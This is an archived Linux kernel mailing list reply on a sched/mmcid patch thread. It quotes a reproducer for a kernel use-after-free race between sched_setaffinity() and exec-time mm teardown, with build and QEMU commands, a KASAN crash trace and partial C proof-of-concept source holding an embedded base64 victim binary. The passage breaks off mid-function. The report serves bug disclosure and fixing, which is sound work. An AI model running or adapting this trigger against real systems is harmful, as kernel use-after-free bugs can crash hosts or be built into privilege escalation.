Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DA25E606A329
	for <linux-mm@archiver.kernel.org>; Tue, 24 Nov 2026 17:28:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=bSNRU5Fo
Received: by kanga.kvack.org (Postfix)
	id 0660B6B07F9; Tue, 24 Nov 2026 12:28:17 -0500 (EST)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 03E396B07FB; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id E6ED66B07FC; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
	by kanga.kvack.org (Postfix) with ESMTP id B50CC6B07F9
	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 12:28:16 -0500 (EST)
Received: from smtpin20.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay10.hostedemail.com (Postfix) with ESMTP id BB61FC0C28
	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 17:28:15 +0000 (UTC)
X-FDA: 85470696150.20.1DAD2BC
Received: from mail-ej1-f48.google.com (mail-ej1-f48.google.com [209.85.218.48])
	by imf17.hostedemail.com (Postfix) with ESMTP id B508740010
	for <linux-mm@kvack.org>; Tue, 24 Nov 2026 17:28:13 +0000 (UTC)
Authentication-Results: imf17.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=bSNRU5Fo;
	dmarc=pass (policy=none) header.from=gmail.com;
	spf=pass (imf17.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.218.48 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
	arc=pass ("google.com:s=arc-20260327:i=1")
ARC-Seal: i=2; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=pass;
	t=1795541293;
	b=bbiwybL6J6O6ccwUjGjAeP2lYayLTIKV/MoC7+dEHZTsu6T9yOJFVJGW2WqdAbOxvwttyh
	8+dVl6kiAEmnXJUmxq+MQWx/AP19/hpnZDB4R4pXBVpoP3t50SXkJJUP1uaxvNYwXCYQNL
	F26rNEuMhN5TC/bABBvmZqpKxkhLplI=
ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1795541293;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references:dkim-signature;
	bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
	b=CYELA/GYCgfg58NL9tKvn+WUX3NcHPojiLYqMcODnKLj3GsGhQv+tMwrP4CW/TcVnsDtgO
	HzIwhGV8rlHWG3NjAfWJCAzXO0XycbzuEpZJsyP94cehDgsGlgCjCL3GvYdods9IRL2HMI
	F+8mzC4WM/sgBDXE3rOeyBXYvAkbpGc=
ARC-Authentication-Results: i=2;
	imf17.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=bSNRU5Fo;
	dmarc=pass (policy=none) header.from=gmail.com;
	spf=pass (imf17.hostedemail.com: domain of bestswngs@gmail.com designates 209.85.218.48 as permitted sender) smtp.mailfrom=bestswngs@gmail.com;
	arc=pass ("google.com:s=arc-20260327:i=1")
Received: by mail-ej1-f48.google.com with SMTP id a640c23a62f3a-c516a194350so297830866b.3
        for <linux-mm@kvack.org>; Tue, 24 Nov 2026 09:28:13 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1795541292; cv=none;
        d=google.com; s=arc-20260327;
        b=X3oJqFsKEjfS8H+CXFNXhGrrE0aSn9szlAybsPmg28LvPsQieH1kvGwLqbf5US/l9n
         N7wqsmQeGTCGmtBovYwVZ5UyOEx9eOc42xNXF6ZrdfJM3DSQjgUz/sYyUqtNZjWKDJ9N
         g7Kqj8kVNldCFSvw3FI4UwVcUerAaThymkvZ8Z2155dKMyeRkZzKCWXyrSVTFdr7YWJ5
         w574wvu45iPA1fd49dRZMgq18U0F5cTG7T7R/AR1NgRzWVqQxa6g+hSUjcmzTjbnfeOx
         ThQKMPelP20LjaflDMtkJ0uxLKhkU1C0Fdj3Tbt7qg5XRhLloxCNejvWt2xyZ1z7AS6S
         q6OQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
        fh=ppkiHqAuyum8v+6lzIgw++SR3/heU1aSVdQ5pkqwMqs=;
        b=nRUbQ01aAMAGVgjbP3s59xkzVNQKhLgrYykMl8eTuipQX8IKLuCudDLqn+ji4b5y2K
         lkjk7rmGc03vIRB7WfRxSVua6dkuBCwOaofAZnH45gcU/ZGAw38CynEVMjPc8LL8qvCW
         7o7nzZCcneX/7a02Fe6Nzp9Seq8wDAnVkBkLrmh3TbIlHrS6yzEl+/APVehqBpwkDYMJ
         SARa0xGV8KiB4j303+pjGeD86czpRaw0MbUFvYRLyDOUn0MOEibjfrTtKHsdeRbbpC70
         TbOMnvcDYC4J5t+MAmfxfD9OOEFl38iTeA8Ts9kQKmj03kNZevGW80ISCc3MCoFUz6wG
         edMw==;
        darn=kvack.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1795541292; x=1796146092; darn=kvack.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
        b=bSNRU5FoNqYdPVWkA3UTAHgM9lcucNOhMd1M745pkhoOfpVYl+/45MO4xcG2+GgwBy
         /DYLFCQO8/eRCW3XWMOW4bNYvkQvJkOCIltSc8JjdVjBd6fOljs81iTAM22TjGlmWFRR
         ZeB8Qw2mL3PkcShowUWEOsrZO4014wD9Ew1mHfUtWtM80oJeff6WEsuqGcw0qulgBIUH
         KP53ulhpVaqsfzs742c1jthOTkfcbjI1OZZpGJ+52Vh+ztATeKqGnQnGKDTkMdqHy5Sp
         Pzia+bOTwPLcFruTgIsz5GKw2DlSEmpNOrFLQUR0CsEsjz3Dc8fFoQ7s10S/OxW1NB2L
         5OTQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795541292; x=1796146092;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=YSrRy9cDPxBOFn2ApsTwRtS2bCEkEgdcRt32a3BvHE4=;
        b=cWjiPPp8O4MkrEO1DqqmoaQGCmzeU0orPQB1SR+PPbQ5oDQ10YwD929xCS7JFNw/Sj
         bS88VFqXZfdvHRq4ZdCg3PdNcQsiErn98XbtMI8iw/WzKG/GacJ3hfRgtsuxnD+pI75K
         utP30M0Rgcg7pPeSPaRotJnTdxhgAgbxRZqafQLHmIj+e+0MP5zve9acFofIBtIjM8QC
         dRCIn+znzRhe57KVeoXit/k7iv61Rz010JSOTOlkPI94uVqrdUruxyPCWZBk8MXcWg7d
         TeFZwJqz26CfspUWJBul06FOBOgHx+3FJb0Dr68slb4XVbqZSG/QH/xHMTuVX44M8R9D
         PLeQ==
X-Forwarded-Encrypted: i=1; AL+hErFrLdZ1mPKw4looGQomo0kNALkqywBnwVJ17msMxP8kw+n5yAjAPP9tN+b772V1kwj8Pqa+dp+2/A==@kvack.org
X-Gm-Message-State: APuU4Z8EpQ12+4EpwLZFGGOYuYSZFv17OedhhJT2b0+h4UWen3oozS/6
	yYD6ZSei2j0MA0FCSoq1Q6bQNfCLquQS47yi1Ujkc28GQg3wLw2bfioW3O2iSwOY6maCtasqCJO
	WcZ3FWBnbitoIivMJzEz1bHLsF817j8k=
X-Gm-Gg: AZFdTZcHFYdjpDSEa8XigglE6wqfQduyVAnCwSwfZxzGkYk/B0Go3ceY8MaW/pw66Kh
	U9BPuLdTQh1AmgGTzXoP1oHoKMafVlkNNrUXK6Sz5F+AQ+cEDY3aLwgw3YQUCpvxkp5OkBETlGb
	zFM9Lk4qQW9uL0DzsidP4ChfAp7Rf9Gt2j6ZmiZiRtYHhwcL/E0uaPyvhkuzj7Zax3wl7PCj6CW
	23Z7Zn9hlQzJJ7KsOn1SXEfmjerAhXs6iK5nNwWeL4MlRE7gCktt/mkiAZ4xsnnUUMQDR3mBfSY
	afeP+YkQOxKr1Lt462nKebhYKACodxLnJamOB0hSYDWMnevGmjimspGhG0LmVkCh169+RgUyQ+S
	JZ7GBrIil1djqTxyzaY2+SCfcHBcrvSYfgk3KzbuA19OlZhp/MyLLiqviS4jhkZ5VxI2JOQ==
X-Received: by 2002:a17:906:da0e:b0:c50:5186:6dc2 with SMTP id
 a640c23a62f3a-c513a84a4b7mr898157466b.24.1795541291905; Tue, 24 Nov 2026
 09:28:11 -0800 (PST)
X-Archived-By: <archiver.kernel.org>
MIME-Version: 1.0
References: <20261110183809.3308868-1-bestswngs@gmail.com> <20261110183809.3308868-2-bestswngs@gmail.com>
 <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
In-Reply-To: <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
From: Weiming Shi <bestswngs@gmail.com>
Date: Tue, 24 Nov 2026 09:27:34 -0800
X-Gm-Features: Aa3M54rf5Ot-8KPAbMAj1Dp2BZXpb3N_CUZJrtz2hUjizqZ6wSfR37UszFqRCEw
Message-ID: <CANgPUi2EtQxVR71WMPx3mQ+wrPwW1OC6CwOht1YK=E_quTHrhQ@mail.gmail.com>
Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity updates
To: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
Cc: Kees Cook <kees@kernel.org>, Alexander Viro <viro@zeniv.linux.org.uk>, 
	Christian Brauner <brauner@kernel.org>, Jan Kara <jack@suse.cz>, Ingo Molnar <mingo@redhat.com>, 
	Peter Zijlstra <peterz@infradead.org>, Juri Lelli <juri.lelli@redhat.com>, 
	Vincent Guittot <vincent.guittot@linaro.org>, Dietmar Eggemann <dietmar.eggemann@arm.com>, 
	Steven Rostedt <rostedt@goodmis.org>, Ben Segall <bsegall@google.com>, Mel Gorman <mgorman@suse.de>, 
	Valentin Schneider <vschneid@redhat.com>, K Prateek Nayak <kprateek.nayak@amd.com>, 
	Thomas Gleixner <tglx@kernel.org>, linux-mm@kvack.org, linux-fsdevel@vger.kernel.org, 
	linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspam-User:
X-Rspamd-Server: rspam05
X-Rspamd-Queue-Id: B508740010
X-Spam-Status: No, score=0.7 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	FROM_LOCAL_NOVOWEL,HEADER_FROM_DIFFERENT_DOMAINS,LOTS_OF_MONEY,
	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS autolearn=no
	autolearn_force=no version=4.0.1
X-Stat-Signature: 3u8kqof9e7c5rw5h5sut46ytz796xbxq
X-HE-Tag: 1795541293-414816
X-HE-Meta: U2FsdGVkX18kefjvuFyV9D5bTSLfo7TmLRGeNLFu6mx+9UJsnDiSPsnaYwC2XHDudllZHiheMlo7CAwgIZm1ue8KlQwuaJKU2DxZ6HY/iJfgqM3bXYdXunmTZLDISfwTuyQyAPfiek23OtdKk2tAV0fcVOcBNvT+CxpULcLi+ETPmuxoqAXrbBm/t/DV2vpZDsMAhzZ3cTNX7sT3edszESXIG0+umMn0z6A1IhS3v7c8i6aDYucqs98i8W9EwHwUiXDyZm/W0kK7Ag/aZaO2tuCpQ8AzLg/DyIQ9oyQWjEspjvnHNpHHk92vP3T07m7YKXhGEbXNBI5KCaE+f4KqNvd1C1FaFHLFhkaIVYp99uv7FZdHct+OenYpkwVZOMdGlAhrNdWZMtPaXrk1wzh4apOLcCkYrC8U8mvig0lB/PSC3Y0dwRmukxnLu3fWMO6lu64eCgEUMTHN3TBNIRmX+rjLE0IpeZdzC4JmQPG+IUoeKw77Y5P7yvc8y1laaBp2EZ/yE5z0JBuvnMBV9Rp7pOZhvq9J1wRsN5Frzql9pVMece0Sotgz+2uvhMmpfmNvNw5rNdXTXDXoz+mEdOvAeFjZiZQV1UungPkuC9ud2nPSzcghBMLvUWe2Vu23SeeLY0M4OBanRkildIiWP7/txpVPUu8CMThgm3GKvi/SKQ8BCA/RtJG5FJdjjW/oh+ZXh/s+ZwYxCQIYHj771O6kblE8TUAXZzr88nWjh7c+anQdxmDpZeRKU+IRDByrwOYI4VL+dax1oHrgCcQBzUkdwQKp+QCfi11BHmabhY6+xjFOqglPSn7seGfYXN5FFymzQoqUaKQL+8trWlFTT4IEbo2Jv+QUGShABVOxX7NPshzi6qwIAS94w0SpDAR2Ws9QlpRZwJFY9xcWzOR941BUsWzazFyDSl+rM77GDxCU8KV3JBnMhs/N8jA6Ovz5/37/stBmPWLH9FGm9KrgZHE
 SAKFjByI
 l81bUIIsKbjxhzvTzuPnmd7/qrIG9DOopSEhgyYa73XFHNn/Oemtoq4uquIvQlT0xwiiCCj8WeksQ61kCjMh30LI+gJGO+sPcYEEj+Q1d3XVSACTXV7w4bXh3j+gezvly8mxITfiTJbTvrVwQjSPo2AA1AOcVCiNA4zRVfYmY16mzmqiB9tmtPSZIqsJvJae7h8NQ4Klv2rhSPfvYpE23pGvlY3b+0mqfN5fKu575LRvPXgyzs0fhC5HUG1QkFW9Q30xj606qt+V1n9+28FQy1sJGYciZ2fqZIyzudjKIR1ad+LlSJzzyeHTL4DfSLWcX4PK5P7jiewpUOwWHZy+4rxPldLbMypeaRrkytaW0gGuNR/3bTZKm3Cp5YoMiVMyqF4+nKHC01mqNceV5PN5D7wnqFtD3lrvX/ROk1r7ah/YyeEwPWJS3wjn7K6Oa0CvvOfCQ1KYLyNxR6kIlcKt/pI+RzJvePOjWR+pISfRO1gVhengONykVPFr2GTleOS8aqIYao64zwvi+QWY9JYQMTIICYJ65kLc6tRpXtwfPZ/i/wMSN8OnVzuI4bQapKkHYNEcqkRz5oJpt/JOH2+cFHD+O56vkYIgxapbqXe0Ob+bvJIZqrpZDWG6s+HbRoRyly5Mx8Je1ZrZHFAyCWWySNtoU+1ZunGYkHg78KCV/OfQobZtexclNvHsXsfrl4hUbln1bgVBbAEpeNBz849TSJOfOWFMNzskgYO5DZ2QYqtB6DTCy9N3HJmtj82Zzm9kDnFUM24NLHwkz28x7WTy82uAH2Q==
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
	aws-us-west-2-korg-listserv-alma10-1

Mathieu Desnoyers <mathieu.desnoyers@efficios.com> =E4=BA=8E2026=E5=B9=B411=
=E6=9C=8810=E6=97=A5=E5=91=A8=E4=BA=8C 10:46=E5=86=99=E9=81=93=EF=BC=9A
>
> +CC tglx.
>
> On 2026-11-10 13:38, Weiming Shi wrote:
> > Hi,
> >
> > Here is a standalone reproducer for the p->mm lifetime race.
> >
> > The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
> > with:
> >
> > ```
> > CONFIG_SMP=3Dy
> > CONFIG_EXPERT=3Dy
> > # CONFIG_FUTEX is not set
> > CONFIG_RSEQ=3Dy
> > CONFIG_SCHED_MM_CID=3Dy
> > CONFIG_KASAN=3Dy
> > CONFIG_KASAN_GENERIC=3Dy
> > CONFIG_KASAN_INLINE=3Dy
> > CONFIG_DEBUG_INFO=3Dy
> > ```
> >
> > KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
> > requires CONFIG_SCHED_MM_CID=3Dy. This exec manifestation also requires
> > CONFIG_FUTEX=3Dn because futex_exec_done() otherwise serializes old-MM =
teardown
> > with the p->pi_lock held by the affinity updater.
> >
> > Dependencies and scheduling setup:
> >
> > - x86-64 Linux guest with at least four online CPUs;
> > - gcc and glibc in the guest to build the PoC;
> > - sched_setaffinity(), memfd_create(), and execveat() available;
> > - eight guest vCPUs scheduled on four host CPUs for the tested 2:1 over=
commit;
> > - UID/GID 65534 for the tested run.
> >
> > Host command:
> >
> > ```
> > taskset -c 0-3 qemu-system-x86_64 \
> >      -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
> >      -kernel bzImage -initrd initramfs.cpio.gz \
> >      -append "console=3DttyS0 rdinit=3D/init nokaslr panic_on_warn=3D1 =
panic=3D-1" \
> >      -nographic -no-reboot
> > ```
> >
> > Build and run inside the guest:
> >
> > ```
> > gcc -O3 -Wall -Wextra -o poc poc.c
> > ./poc 180
> > ```
> >
> > The reproducer works as follows:
> >
> > 1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
> > 2. The victim initially pins itself to the penultimate guest CPU. The s=
etters
> >     then alternate its affinity between that CPU alone and the last two=
 guest
> >     CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_=
PATH).
> > 3. Up to six same-UID setter processes run on the other CPUs and altern=
ate the
> >     victim between one- and two-CPU affinity masks.
> > 4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
> > 5. Host CFS overcommit can deschedule a setter after it loads the
> >     victim's old p->mm. The victim can then complete setup_new_exec() a=
nd free
> >     that old mm before the setter reaches mm_update_cpus_allowed().
> >
> > The PoC counts syscall attempts, successful affinity updates, errors, a=
nd
> > completed victim execs separately. Every ten-second window must contain=
 both
> > a successful affinity update and victim exec progress. It checks for an=
 early
> > victim or setter exit, and a clean result requires successful child sta=
tuses.
> >
> > This is a stochastic race. The progress-checking version reported the U=
AF
> > after about 52.60 seconds. The last completed ten-second window before =
the
> > crash recorded 2,096,128 successful affinity updates, zero errors, and =
18,975
> > completed execs:
> >
> > ```
> > BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
> > Read of size 4 at addr ffff888123155e4c by task poc/5132
> > CPU: 4 UID: 65534 PID: 5132 Comm: poc
> >
> > Call Trace:
> >   set_cpus_allowed_common             kernel/sched/core.c:10835
> >   set_cpus_allowed_fair               kernel/sched/fair.c:10046
> >   __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
> >   __set_cpus_allowed_ptr              kernel/sched/core.c:3258
> >   __sched_setaffinity                 kernel/sched/syscalls.c:1161
> >   sched_setaffinity                   kernel/sched/syscalls.c:1239
> >   __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
> >
> > Freed by task 5127:
> >   kmem_cache_free                     mm/slub.c:6757
> >   __mmput                             kernel/fork.c:1204
> >   mmput                               kernel/fork.c:1215
> >   setup_new_exec                      fs/exec.c:1395
> >   load_elf_binary                     fs/binfmt_elf.c:1024
> >   bprm_execve                         fs/exec.c:1865
> >   do_execveat_common.isra.0           fs/exec.c:1963
> >   __x64_sys_execveat                  fs/exec.c:2047
> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
> > ```
> >
> > Complete PoC:
> >
> > ```c
> > /*
> >   * Standalone reproducer for the sched/mmcid p->mm UAF.
> >   *
> >   * Build: gcc -O3 -o poc poc.c
> >   * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
> >   * Guest: ./poc [seconds]
> >   *
> >   * The tiny self-exec victim is embedded below and executed from memfd=
.  The
> >   * tested VM used CONFIG_SCHED_MM_CID=3Dy, CONFIG_FUTEX=3Dn and 2:1 vC=
PU
> >   * overcommit (8 vCPUs on 4 host CPUs).
> >   */
> > #define _GNU_SOURCE
> > #include <errno.h>
> > #include <fcntl.h>
> > #include <poll.h>
> > #include <sched.h>
> > #include <signal.h>
> > #include <stdint.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <sys/eventfd.h>
> > #include <sys/mman.h>
> > #include <sys/prctl.h>
> > #include <sys/stat.h>
> > #include <sys/syscall.h>
> > #include <sys/time.h>
> > #include <sys/types.h>
> > #include <sys/wait.h>
> > #include <time.h>
> > #include <unistd.h>
> >
> > #define DEFAULT_RUNTIME 180
> > #define MAX_SETTERS 6
> > #define READY_FD 3
> > #define VICTIM_FD 4
> > #define VICTIM_SIZE 848
> >
> > /* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. =
*/
> > static const char victim_b64[] =3D
> > "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAE=
AAOAAC"
> > "AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAA=
AAAAAQ"
> > "AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AACAAA"
> > "AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQA=
C4CwAA"
> > "AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kA=
EAAAAA"
> > "AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ=
AAAAQA"
> > "8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAU=
AAAAAA"
> > "AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAA=
AAAAAA"
> > "AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaH=
N0cnRh"
> > "YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAAAAA"
> > "AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAA=
AAiAAA"
> > "AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAA=
A4AQAA"
> > "AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAA=
AAAAAA"
> > "AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAA=
AAAAAA"
> > "AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=3D=
";
> >
> > struct setter_stats {
> >       volatile unsigned long long attempts;
> >       volatile unsigned long long successes;
> >       volatile unsigned long long errors;
> > };
> >
> > struct shared_state {
> >       struct setter_stats setters[MAX_SETTERS];
> > };
> >
> > static int b64_value(unsigned char c)
> > {
> >       if (c >=3D 'A' && c <=3D 'Z')
> >               return c - 'A';
> >       if (c >=3D 'a' && c <=3D 'z')
> >               return c - 'a' + 26;
> >       if (c >=3D '0' && c <=3D '9')
> >               return c - '0' + 52;
> >       if (c =3D=3D '+')
> >               return 62;
> >       if (c =3D=3D '/')
> >               return 63;
> >       return -1;
> > }
> >
> > static int install_victim(void)
> > {
> >       unsigned char out[VICTIM_SIZE];
> >       size_t i, n =3D 0;
> >       unsigned int acc =3D 0, bits =3D 0;
> >       int fd;
> >
> >       for (i =3D 0; victim_b64[i] && victim_b64[i] !=3D '=3D'; i++) {
> >               int v =3D b64_value((unsigned char)victim_b64[i]);
> >
> >               if (v < 0)
> >                       continue;
> >               acc =3D (acc << 6) | (unsigned int)v;
> >               bits +=3D 6;
> >               if (bits >=3D 8) {
> >                       bits -=3D 8;
> >                       if (n =3D=3D sizeof(out)) {
> >                               errno =3D EOVERFLOW;
> >                               return -1;
> >                       }
> >                       out[n++] =3D (unsigned char)(acc >> bits);
> >                       acc &=3D (1U << bits) - 1;
> >               }
> >       }
> >       if (n !=3D sizeof(out)) {
> >               errno =3D EINVAL;
> >               return -1;
> >       }
> >       fd =3D syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
> >       if (fd < 0)
> >               return -1;
> >       if (fd !=3D VICTIM_FD) {
> >               if (dup2(fd, VICTIM_FD) < 0) {
> >                       close(fd);
> >                       return -1;
> >               }
> >               close(fd);
> >               fd =3D VICTIM_FD;
> >       }
> >       if (write(fd, out, n) !=3D (ssize_t)n || fchmod(fd, 0700))
> >               return -1;
> >       return 0;
> > }
> >
> > static int install_exec_counter(void)
> > {
> >       int fd =3D eventfd(0, EFD_NONBLOCK);
> >
> >       if (fd < 0)
> >               return -1;
> >       if (fd !=3D READY_FD) {
> >               if (dup2(fd, READY_FD) < 0) {
> >                       close(fd);
> >                       return -1;
> >               }
> >               close(fd);
> >       }
> >       return 0;
> > }
> >
> > static void pin_self(int cpu)
> > {
> >       cpu_set_t mask;
> >
> >       CPU_ZERO(&mask);
> >       CPU_SET(cpu, &mask);
> >       if (sched_setaffinity(0, sizeof(mask), &mask)) {
> >               fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
> >               _exit(2);
> >       }
> > }
> >
> > static void alarm_handler(int sig)
> > {
> >       (void)sig;
> > }
> >
> > static void enable_irq_pressure(void)
> > {
> >       struct sigaction sa =3D { .sa_handler =3D alarm_handler };
> >       struct itimerval timer =3D {
> >               .it_interval =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
> >               .it_value =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
> >       };
> >
> >       sigemptyset(&sa.sa_mask);
> >       sa.sa_flags =3D SA_RESTART;
> >       if (sigaction(SIGALRM, &sa, NULL) ||
> >           setitimer(ITIMER_REAL, &timer, NULL))
> >               _exit(3);
> > }
> >
> > static int drain_exec_counter(unsigned long long *total)
> > {
> >       uint64_t value;
> >
> >       for (;;) {
> >               ssize_t ret =3D read(READY_FD, &value, sizeof(value));
> >
> >               if (ret =3D=3D sizeof(value)) {
> >                       *total +=3D value;
> >                       continue;
> >               }
> >               if (ret < 0 && errno =3D=3D EINTR)
> >                       continue;
> >               if (ret < 0 && errno =3D=3D EAGAIN)
> >                       return 0;
> >               return -1;
> >       }
> > }
> >
> > static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
> > {
> >       struct pollfd pfd =3D { .fd =3D READY_FD, .events =3D POLLIN };
> >       int status, ret;
> >
> >       do {
> >               ret =3D poll(&pfd, 1, 5000);
> >       } while (ret < 0 && errno =3D=3D EINTR);
> >       if (ret !=3D 1 || !(pfd.revents & POLLIN) ||
> >           drain_exec_counter(execs) || !*execs)
> >               return -1;
> >       ret =3D waitpid(victim, &status, WNOHANG);
> >       if (ret =3D=3D victim) {
> >               errno =3D ECHILD;
> >               return -1;
> >       }
> >       return ret < 0 ? -1 : 0;
> > }
> >
> > static void publish_stats(struct setter_stats *stats,
> >                         unsigned long long attempts,
> >                         unsigned long long successes,
> >                         unsigned long long errors)
> > {
> >       __atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
> >       __atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
> >       __atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
> > }
> >
> > static void run_setter(pid_t victim, int cpu, int victim_a, int victim_=
b,
> >                      int index, time_t deadline, struct shared_state *s=
tate)
> > {
> >       cpu_set_t one, two;
> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
> >
> >       prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
> >       pin_self(cpu);
> >       enable_irq_pressure();
> >       CPU_ZERO(&one);
> >       CPU_SET(victim_a, &one);
> >       CPU_ZERO(&two);
> >       CPU_SET(victim_a, &two);
> >       CPU_SET(victim_b, &two);
> >       while (time(NULL) < deadline) {
> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), =
&one))
> >                       successes++;
> >               else
> >                       errors++;
> >               attempts++;
> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), =
&two))
> >                       successes++;
> >               else
> >                       errors++;
> >               attempts++;
> >               if (!(attempts & 0x3ff))
> >                       publish_stats(&state->setters[index], attempts,
> >                                     successes, errors);
> >       }
> >       publish_stats(&state->setters[index], attempts, successes, errors=
);
> >       _exit(0);
> > }
> >
> > static void load_totals(struct shared_state *state, int nset,
> >                       unsigned long long *attempts,
> >                       unsigned long long *successes,
> >                       unsigned long long *errors)
> > {
> >       int i;
> >
> >       *attempts =3D *successes =3D *errors =3D 0;
> >       for (i =3D 0; i < nset; i++) {
> >               *attempts +=3D __atomic_load_n(&state->setters[i].attempt=
s,
